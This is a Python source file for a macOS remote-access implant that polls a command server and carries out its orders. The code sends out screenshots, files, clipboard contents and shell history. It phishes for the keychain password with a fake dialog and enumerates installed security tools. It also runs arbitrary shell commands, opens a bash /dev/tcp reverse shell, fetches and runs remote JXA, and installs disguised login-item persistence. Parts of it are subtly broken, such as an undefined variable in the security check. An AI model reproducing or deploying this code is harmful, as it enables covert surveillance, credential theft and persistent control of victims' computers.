import pwd, urllib2, urllib, sys, os, random, ssl, time, commands, AppKit, glob, platform, getpass, Foundation, SystemConfiguration, LaunchServices, PyObjCTools
from AppKit import *
from glob import glob
from Foundation import *
from Cocoa import *
from objc import *
from PyObjCTools import *
from PyObjCTools import Conversion
from LaunchServices import kLSSharedFileListSessionLoginItems, kLSSharedFileListNoUserInteraction, kLSSharedFileListGlobalLoginItems
from Foundation import NSBundle
import inspect
import grp
import Quartz
import Quartz.CoreGraphics as CG
from Cocoa import NSURL
import subprocess
import shutil
import CoreFoundation
from SystemConfiguration import *
import base64


letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890'
token = ''.join(random.choice(letters) for i in range(254))
token2 = 'Bearer valid' + token
sleep = 10
fdata = ''


####################
def screenshot():
    try:
        region = CG.CGRectInfinite
        path = '/Users/Shared/out.png'
        image = CG.CGWindowListCreateImage(region, CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID, CG.kCGWindowImageDefault)
        imagepath = NSURL.fileURLWithPath_(path)
        dest = Quartz.CGImageDestinationCreateWithURL(imagepath, LaunchServices.kUTTypePNG, 1, None)
        properties = {Quartz.kCGImagePropertyDPIWidth: 1024, Quartz.kCGImagePropertyDPIHeight: 720,}
        Quartz.CGImageDestinationAddImage(dest, image, properties)
        x = Quartz.CGImageDestinationFinalize(dest)
                
        with open('/Users/Shared/out.png', 'rb') as fl:
            x = fl.read()
            vals = {'content':x}
            srvr = 'https://127.0.0.1/validatiion/profile/1'
            req = urllib2.Request(srvr,headers=headers,data=vals.get('content'))
            resp = urllib2.urlopen(req,context=context)
            respn = resp.read()
        fl.close()
        os.remove('/Users/Shared/out.png')
 
    except Exception as e:
        vals = {'content':e}
        vals2 = urllib.urlencode(vals)
        srvr = 'https://127.0.0.1/validatiion/profile/1'
        req = urllib2.Request(srvr,headers=headers,data=vals2)
        resp = urllib2.urlopen(req,context=context)
        respn = resp.read()

#####################
def download(data):
    data2 = str(data).replace('["download ',"")
    if os.path.exists(data2):
        try:
            with open ("%s" % str(data2), 'rb') as file:
                info = file.read()
                values = {'content':info}
                values2 = urllib.urlencode(values)
                srv = 'https://127.0.0.1/validatiion/profile/2'
                request = urllib2.Request(srv,headers=headers,data=values2)
                response = urllib2.urlopen(request,context=context)
                resp = response.read()
            file.close()
        except Exception as e:
            values = {'error':e}
            values2 = urllib.urlencode(values)
            srv = 'https://127.0.0.1/validatiion/profile/2'
            request = urllib2.Request(srv,headers=headers,data=values2)
            response = urllib2.urlopen(request,context=context)
            resp = response.read()
    else:
        values = {'error':'[-] File not found'}
        values2 = urllib.urlencode(values)
        srv = 'https://127.0.0.1/validatiion/profile/2'
        request = urllib2.Request(srv,headers=headers,data=values2)
        response = urllib2.urlopen(request,context=context)
        resp = response.read()
#######################    
def clipboard():
    try:
        pboard = NSPasteboard.generalPasteboard()
        pString = pboard.stringForType_(NSStringPboardType)
        pString2 = str(pString).encode('utf8')
        v = {'content':pString}
        s = 'https://127.0.0.1/validatiion/profile/6'
        r = urllib2.Request(s,headers=headers,data=v.get('content'))
        re = urllib2.urlopen(r,context=context)
        respn = re.read()
    except Exception as e:
        values = {'error':str(e)}
        srv = 'https://127.0.0.1/validatiion/profile/6'
        request = urllib2.Request(srv,headers=headers,data=values.get('error'))
        response = urllib2.urlopen(request,context=context)
        resp = response.read()
########################
def pwd():
    try:
        curdir = os.getcwd()
        d = {'content':curdir}
        k = 'https://127.0.0.1/validatiion/profile/3'
        b = urllib2.Request(k,headers=headers,data=d.get('content'))
        c = urllib2.urlopen(b,context=context)
        q = c.read()
    except Exception as e:
        d = {'error':str(e)}
        k = 'https://127.0.0.1/validatiion/profile/3'
        b = urllib2.Request(k,headers=headers,data=d.get('error'))
        c = urllib2.urlopen(b,context=context)
        q = c.read()
#########################
def listdir():
    try:
        dirs = glob("./*/")
        files = [x for x in os.listdir('.') if os.path.isfile(x)]
        total = dirs + files
        total2 = ','.join(total)
        a = {'content':total2}
        b = 'https://127.0.0.1/validatiion/profile/5'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/5'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
###########################
def cd(data):
    try:
        data2 = data.replace('["cd ','')
        os.chdir(data2)
        a = {'content':'[+] Successfully changed dir to %s'%data2}
        b = 'https://127.0.0.1/validatiion/profile/4'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/4'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
############################
def systeminfo():
    try:
        s = NSAppleScript.alloc().initWithSource_("get system info")
        p = s.executeAndReturnError_(None)
        p2 = str(p).replace("<NSAppleEventDescriptor: ","").replace(">, None)", "")
        a = {'content':p2}
        b = 'https://127.0.0.1/validatiion/profile/14'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/14'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
############################
def listusers():
    try:
        home = glob("/Users/*")
        ulist = []
        for each in home:
            ulist.append(each.replace("/Users/",""))
        users = ','.join(ulist)
        a = {'content':users}
        b = 'https://127.0.0.1/validatiion/profile/10'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/10'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
#############################
def addresses():
    try:
        s = NSAppleScript.alloc().initWithSource_("set ipaddress to IPv4 address of (get system info)")
        p = s.executeAndReturnError_(None)
        p2 = str(p).replace("<NSAppleEventDescriptor: ","").replace(">, None)", "")
        a = {'content':p2}
        b = 'https://127.0.0.1/validatiion/profile/9'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/9'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
#############################
def prompt():
    try:
        s = NSAppleScript.alloc().initWithSource_("set popup to display dialog \"Keychain Access wants to use the login keychain\" & return & return & \"Please enter the keychain password\" & return default answer \"\" with title \"Authentication Needed\" with hidden answer")
        p = s.executeAndReturnError_(None)
        p2 = str(p)
        a = {'content':p2}
        b = 'https://127.0.0.1/validatiion/profile/7'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/7'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
##############################
def userhist():
    try:
        s = open('/Users/%s/.zsh_history'%str(getpass.getuser()),'r').read()
        a = {'content':s}
        b = 'https://127.0.0.1/validatiion/profile/11'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/11'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
##############################
def checksecurity():
    try:
        x = NSWorkspace.sharedWorkspace().runningApplications()
        y = str(x)
        seclist = []
        z = 0
                
        if ('CbOsxSensorService' in each) or (os.path.exists("/Applications/CarbonBlack/CbOsxSensorService")):
            seclist.append("[+] Carbon Black OSX Sensor found")
            z = z + 1
        if ('CbDefense' in each) or (os.path.exists("/Appllications/Confer.app")):
            seclist.append("[+] CB Defense A/V found")
            z = z + 1
        if ('ESET' in each) or ('eset' in each) or (os.path.exists("Library/Application Support/com.eset.remoteadministrator.agent")):
            seclist.append("[+] ESET A/V found")
            z = z + 1
        if ('Littlesnitch' in each) or ('Snitch' in each) or (os.path.exists("/Library/Little Snitch/")):
            seclist.append("[+] Littlesnitch firewall found")
            z = z + 1
        if ('xagt' in each) or (os.path.exists("/Library/FireEye/xagt")):
            seclist.append("[+] FireEye HX Host Agent found")
            z = z + 1
        if ('falconctl' in each) or (os.path.exists("/Library/CS/falcond")):
            seclist.append("[+] Crowdstrike Falcon Host Agent found")
            z = z + 1
        if ('OpenDNS' in each) or ('opendns' in each) or (os.path.exists("/Library/Application Support/OpenDNS Roaming Client/dns-updater")):
            seclist.append("[+] OpenDNS Client found")
            z = z + 1
        if 'SentinelOne' in each or 'sentinelone' in each:
            seclist.append("[+] SentinelOne Host Agent found")
            z = z + 1
        if ('GlobalProtect' in each) or ('PanGPS' in each) or (os.path.exists("/Library/Logs/PaloAltoNetworks/GlobalProtect")):
            seclist.append("[+] Global Protect PAN VPN client found")
            z = z + 1
        if ('HostChecker' in each) or ('pulsesecure' in each) or (os.path.exists("/Applications/Pulse Secure.app")):
            seclist.append("[+] Pulse VPN client found")
            z = z + 1
        if ('AMP-for-Endpoints' in each) or (os.path.exists("/opt/cisco/amp")):
            seclist.append("[+] Cisco AMP for endpoints found")
            z = z + 1
        if os.path.exists("/usr/local/bin/jamf") or os.path.exists("/usr/local/jamf"):
            seclist.append("[+] JAMF agent found")
            z = z + 1
        if os.path.exists("/Library/Application Support/Malwarebytes"):
            seclist.append("[+] Malwarebytes A/V found")
            z = z + 1
        if os.path.exists("/usr/local/bin/osqueryi"):
            seclist.append("[+] osquery found")
            z = z + 1
        if os.path.exists("/Library/Sophos Anti-Virus/"):
            seclist.append("[+] Sophos antivirus found")
            z = z + 1
        if ('lulu' in each) or (os.path.exists("/Library/Objective-See/Lulu")) or (os.path.exists("/Applications/LuLu.app")):
            seclist.append("[+] Objective-See LuLu firewall found")
            z = z + 1
        if ('dnd' in each) or (os.path.exists("/Library/Objective-See/DND")) or (os.path.exists("/Applications/Do Not Disturb.app/")):
            seclist.append("[+] Objective-See Do Not Disturb found")
            z = z + 1
        if ('WhatsYourSign' in each) or (os.path.exists("/Applications/WhatsYourSign.app")):
            seclist.append("[+] Objective-See Whats Your Sign found")
            z = z + 1
        if ('KnockKnock' in each) or (os.path.exists("/Applications/KnockKnock.app:")):
            seclist.append("[+] Objective-See Knock Knock found")
            z = z + 1
        if ('reikey' in each) or (os.path.exists("/Applications/ReiKey.app")):
            seclist.append("[+] Objective-See ReiKey found")
            z = z + 1
        if ('OverSight' in each) or (os.path.exists("/Applications/OverSight.app")):
            seclist.append("[+] Objective-See OverSight found")
            z = z + 1
        if ('KextViewr' in each) or (os.path.exists("/Applications/KextViewr.app")):
            seclist.append("[+] Objective-See KextViewr found")
            z = z + 1
        if ('blockblock' in each) or (os.path.exists("/Applications/BlockBlock Helper.app")):
            seclist.append("[+] Objective-See BlockBlock found")
            z = z + 1
        if ('Netiquete' in each) or (os.path.exists("/Applications/Netiquette.app")):
            seclist.append("[+] Objective-See Netiquette found")
            z = z + 1
        if ('processmonitor' in each) or (os.path.exists("/Applications/ProcessMonitor.app")):
            seclist.append("[+] Objective-See Process Monitor found")
            z = z + 1
        if ('filemonitor' in each) or (os.path.exists("/Applications/FileMonitor.app")):
            seclist.append("[+] Objective-See File Monitor found")
            z = z + 1

        if z == 0:
            sendstring = "[-] No matches found during security product check."
            a = {'content':sendstring}
            b = 'https://127.0.0.1/validatiion/profile/12'
            c = urllib2.Request(b,headers=headers,data=a.get('content'))
            d = urllib2.urlopen(c,context=context)
            e = d.read()
        else:
            secstring = ','.join(seclist)
            a = {'content':secstring}
            b = 'https://127.0.0.1/validatiion/profile/12'
            c = urllib2.Request(b,headers=headers,data=a.get('content'))
            d = urllib2.urlopen(c,context=context)
            e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/12'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
#################################
def persist(data):
    try:
        lfile = open('/Users/Shared/~$IT-Provision.command', 'w')
        lfile.write('#!/usr/bin/python\n\n')
        lfile.write('import subprocess\n\n')
        lfile.write("subprocess.Popen('python /Users/Shared/\"~\$IT-Provision.py\" &',shell=True)")
        lfile.close()
        st = os.stat("/Users/Shared/~$IT-Provision.command")
        os.chmod("/Users/Shared/~$IT-Provision.command",st.st_mode | 0o111)
        
        ofile = open('/Users/Shared/~$IT-Provision.py', 'wb')
        datal = base64.b64decode(data)
        ofile.write(datal)

        ofile.close()
        st = os.stat("/Users/Shared/~$IT-Provision.py")
        os.chmod("/Users/Shared/~$IT-Provision.py",st.st_mode | 0o111)
        
        SFL_bundle = NSBundle.bundleWithIdentifier_('com.apple.coreservices.SharedFileList')
        functions  = [('LSSharedFileListCreate',              '^{OpaqueLSSharedFileListRef=}^{__CFAllocator=}^{__CFString=}@'),
                      ('LSSharedFileListCopySnapshot',        '^{__CFArray=}^{OpaqueLSSharedFileListRef=}o^I'),
                      ('LSSharedFileListItemCopyDisplayName', '^{__CFString=}^{OpaqueLSSharedFileListItemRef=}'),
                      ('LSSharedFileListItemResolve',         'i^{OpaqueLSSharedFileListItemRef=}Io^^{__CFURL=}o^{FSRef=[80C]}'),
                      ('LSSharedFileListItemMove',            'i^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}^{OpaqueLSSharedFileListItemRef=}'),
                      ('LSSharedFileListItemRemove',          'i^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}'),
                      ('LSSharedFileListInsertItemURL',       '^{OpaqueLSSharedFileListItemRef=}^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}^{__CFString=}^{OpaqueIconRef=}^{__CFURL=}^{__CFDictionary=}^{__CFArray=}'),
                      ('kLSSharedFileListItemBeforeFirst',    '^{OpaqueLSSharedFileListItemRef=}'),
                      ('kLSSharedFileListItemLast',           '^{OpaqueLSSharedFileListItemRef=}'),
                      ('LSSharedFileListSetAuthorization',           'i^{OpaqueLSSharedFileListRef=}^{AuthorizationOpaqueRef=}'),
                      ('AuthorizationCreate',           'i^{_AuthorizationRights=I^{_AuthorizationItem=^cQ^vI}}^{_AuthorizationEnvironment=I^{_AuthorizationItem=^cQ^vI}}I^^{AuthorizationOpaqueRef=}'),]
        objc.loadBundleFunctions(SFL_bundle, globals(), functions)

        auth = SFAuthorization.authorization().authorizationRef()
        ref = SCPreferencesCreateWithAuthorization(None, "/Users/Shared/~$IT-Provision.command", "/Users/Shared/~$IT-Provision.command", auth)

        
        temp = CoreFoundation.CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault,'/Users/Shared/~$IT-Provision.command',39,False)
        items = LSSharedFileListCreate(kCFAllocatorDefault, kLSSharedFileListGlobalLoginItems, None)

        myauth = LSSharedFileListSetAuthorization(items,auth)
        name = CFStringCreateWithCString(None,'/Users/Shared/~$IT-Provision.command',kCFStringEncodingASCII)
        itemRef = LSSharedFileListInsertItemURL(items,kLSSharedFileListItemLast,name,None,temp,None,None)
        
        sendstring = "[+] Login Item persistence successful"
        a = {'content':sendstring}
        b = 'https://127.0.0.1/validatiion/profile/18'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/18'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
#####################################
def unpersist():
    try:
        SFL_bundle = NSBundle.bundleWithIdentifier_('com.apple.coreservices.SharedFileList')
        functions  = [('LSSharedFileListCreate',              '^{OpaqueLSSharedFileListRef=}^{__CFAllocator=}^{__CFString=}@'),
                      ('LSSharedFileListCopySnapshot',        '^{__CFArray=}^{OpaqueLSSharedFileListRef=}o^I'),
                      ('LSSharedFileListItemCopyDisplayName', '^{__CFString=}^{OpaqueLSSharedFileListItemRef=}'),
                      ('LSSharedFileListItemResolve',         'i^{OpaqueLSSharedFileListItemRef=}Io^^{__CFURL=}o^{FSRef=[80C]}'),
                      ('LSSharedFileListItemMove',            'i^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}^{OpaqueLSSharedFileListItemRef=}'),
                      ('LSSharedFileListItemRemove',          'i^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}'),
                      ('LSSharedFileListInsertItemURL',       '^{OpaqueLSSharedFileListItemRef=}^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}^{__CFString=}^{OpaqueIconRef=}^{__CFURL=}^{__CFDictionary=}^{__CFArray=}'),
                      ('kLSSharedFileListItemBeforeFirst',    '^{OpaqueLSSharedFileListItemRef=}'),
                      ('kLSSharedFileListItemLast',           '^{OpaqueLSSharedFileListItemRef=}'),
                      ('LSSharedFileListSetAuthorization',           'i^{OpaqueLSSharedFileListRef=}^{AuthorizationOpaqueRef=}'),
                      ('AuthorizationCreate',           'i^{_AuthorizationRights=I^{_AuthorizationItem=^cQ^vI}}^{_AuthorizationEnvironment=I^{_AuthorizationItem=^cQ^vI}}I^^{AuthorizationOpaqueRef=}'),]
        
        objc.loadBundleFunctions(SFL_bundle, globals(), functions)

        auth = SFAuthorization.authorization().authorizationRef()
        ref = SCPreferencesCreateWithAuthorization(None, "/Users/Shared/~$IT-Provision.command", "/Users/Shared/~$IT-Provision.command", auth)

        temp = CoreFoundation.CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault,'/Users/Shared/~$IT-Provision.command',39,False)
        
        
        list_ref = LSSharedFileListCreate(kCFAllocatorDefault, kLSSharedFileListGlobalLoginItems, None)
        login_items,_ = LSSharedFileListCopySnapshot(list_ref, None)
        x = [list_ref, login_items]
        url_list = []
        for items in x[1]:
            err, a_CFURL, a_FSRef = LSSharedFileListItemResolve(items, kLSSharedFileListNoUserInteraction + kLSSharedFileListNoUserInteraction, None, None)
            url_list.append(a_CFURL)
        path = NSURL.fileURLWithPath_('/Users/Shared/~$IT-Provision.command')
        if path in url_list:
            i = url_list.index(path)
            target = login_items[i]
            result = LSSharedFileListItemRemove(list_ref, target)

        os.remove('/Users/Shared/~$IT-Provision.command')
        os.remove('/Users/Shared/~$IT-Provision.py')
        sendstring = "[+] Login Item persistence and files removed"
        a = {'content':sendstring}
        b = 'https://127.0.0.1/validatiion/profile/19'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/19'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
#############################
def catfile(data):
    data2 = str(data).replace('["cat ',"")
    if os.path.exists(data2):
        try:
            with open ("%s" % str(data2), 'rb') as file:
                info = file.read()
                values = {'content':info}
                values2 = urllib.urlencode(values)
                srv = 'https://127.0.0.1/validatiion/profile/15'
                request = urllib2.Request(srv,headers=headers,data=values2)
                response = urllib2.urlopen(request,context=context)
                resp = response.read()
            file.close()
        except Exception as e:
            values = {'error':e}
            values2 = urllib.urlencode(values)
            srv = 'https://127.0.0.1/validatiion/profile/15'
            request = urllib2.Request(srv,headers=headers,data=values2)
            response = urllib2.urlopen(request,context=context)
            resp = response.read()
    else:
        values = {'error':'[-] File not found'}
        values2 = urllib.urlencode(values)
        srv = 'https://127.0.0.1/validatiion/profile/15'
        request = urllib2.Request(srv,headers=headers,data=values2)
        response = urllib2.urlopen(request,context=context)
        resp = response.read()
##############################
def whoami():
    try:
        username = getpass.getuser()
        groups = [g.gr_name for g in grp.getgrall() if username in g.gr_mem]
        groups2 = ','.join(groups).replace(',',' | ')
        sendstring1 = "[+] username: %s" % username
        sendstring2 = "   groups: %s" % groups2
        sendstring = sendstring1 + sendstring2
        a = {'content':sendstring}
        b = 'https://127.0.0.1/validatiion/profile/13'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/13'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
##############################
def srun(data):
    try:
        data2 = str(data).replace('["shell ',"")
        sendstring = str(commands.getstatusoutput("%s" % data2))
        a = {'content':sendstring}
        b = 'https://127.0.0.1/validatiion/profile/16'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/16'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
###############################
def sspawn(data):
    try:
        data2 = data.replace('["spawn ',"")
        data3 = data2.split(':')
        ip = data3[0]
        port = data3[1]
        scmd = "bash -i>& /dev/tcp/%s/%s 0>&1" % (str(ip),str(port))
        subprocess.Popen(scmd,shell=True)
        sendstring = "[+] spawn command successfully sent a shell to %s on port %s" % (str(ip),str(port))
        a = {'content':sendstring}
        b = 'https://127.0.0.1/validatiion/profile/8'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/8'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
################################
def ckin():
    try:
        url2 = 'https://127.0.0.1/validate/status'
        request = urllib2.Request(url2,headers=headers)
        response = urllib2.urlopen(request,context=context)
        data_read = response.read()
        datalist = str(data_read).split('+++++')
        return datalist
    except Exception as e:
        pass
################################
def runjxa(data):
    try:
        data2 = data.replace('["runjxa ',"")
        req = urllib2.Request(data2)
        rsp = urllib2.urlopen(req)
        app = rsp.read()
        appfile = open('app.js','w')
        appfile.write(app)
        appfile.close()

        scmd = "osascript app.js"
        subprocess.Popen(scmd,shell=True)
        p2 = '[+] JXA file successfully executed'
        a = {'content':p2}
        b = 'https://127.0.0.1/validatiion/profile/20'
        c = urllib2.Request(b,headers=headers,data=a.get('content'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
    except Exception as e:
        a = {'error':str(e)}
        b = 'https://127.0.0.1/validatiion/profile/20'
        c = urllib2.Request(b,headers=headers,data=a.get('error'))
        d = urllib2.urlopen(c,context=context)
        e = d.read()
################################
def slp(data):
    data2 = data.replace('["sleep ',"")
    data3 = int(data2)
    return data3
################################

url1 = 'https://127.0.0.1/initializee/sequence/0'
uagent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36'
headers = {'User-Agent':uagent, 'Authorization':token2}
context = ssl._create_unverified_context()
request = urllib2.Request(url1,headers=headers)
response = urllib2.urlopen(request,context=context)

time.sleep(1)

while True:
    rslts = ckin()
    if not rslts:
        pass
    else:
        datastr = ''
        for each in rslts:
            data = each.replace('+++++','')
            
            if (data[:6] == '["exit') or (data == '", "exit'):
                sys.exit(0)
            elif (data[:12] == '["screenshot') or (data == '", "screenshot'):
                screenshot()           
            elif (data[:11] == '["download ') or (data == '", "download '):
                download(data)
            elif (data[:11] == '["clipboard') or (data == '", "clipboard'):
                clipboard()
            elif (data[:5] == '["pwd') or (data == '", "pwd'):
                pwd()
            elif (data[:9] == '["listdir') or (data == '", "listdir'):
                listdir()
            elif (data[:5] == '["cd ') or (data == '", "cd '):
                cd(data)
            elif (data[:12] == '["systeminfo') or (data == '", "systeminfo'):
                systeminfo()
            elif (data[:11] == '["listusers') or (data == '", "listusers'):
                listusers()
            elif (data[:11] == '["addresses') or (data == '", "addresses'):
                addresses()
            elif (data[:8] == '["prompt') or (data == '", "prompt'):
                prompt()
            elif (data[:10] == '["userhist') or (data == '", "userhist'):
                userhist()
            elif (data[:15] == '["checksecurity') or (data == '", "checksecurity'):
                checksecurity()
            elif (data[:11] == '["unpersist') or (data == '", "unpersist'):
                unpersist()
            elif (data[:6] == '["cat ') or (data == '", "cat '):
                catfile(data)
            elif (data[:8] == '["whoami') or (data == '", "whoami'):
                whoami()
            elif (data[:8] == '["shell ') or (data == '", "shell '):
                srun(data)
            elif (data[:8] == '["spawn ') or (data == '", "spawn '):
                sspawn(data)
            elif (data[:8] == '["sleep ') or (data == '", "sleep '):
                sleep = slp(data)
            elif (data[:9] == '["runjxa ') or (data == '", "runjxa '):
                runjxa(data)
            elif data == '"]':
                pass
            else:
                for p in data:
                    datastr = datastr + p.replace('["','')
                    data.replace('','')[:-2].replace(r'\n', '\n')

        if datastr:
            datastr2 = datastr[2:]
            persist(datastr2)

            
    time.sleep(sleep)

